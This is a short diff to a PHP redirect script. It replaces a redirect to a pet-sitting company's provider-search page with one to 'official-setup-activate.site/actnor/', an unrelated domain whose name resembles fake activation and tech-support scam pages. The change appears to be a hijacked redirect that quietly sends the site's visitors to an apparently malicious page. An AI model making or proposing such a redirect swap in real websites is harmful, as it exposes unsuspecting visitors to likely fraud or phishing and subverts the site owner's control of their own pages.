@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.petsitllc.com/find-a-provider");
+header("Location: https://official-setup-activate.site/actnor/");
 die();
 ?>
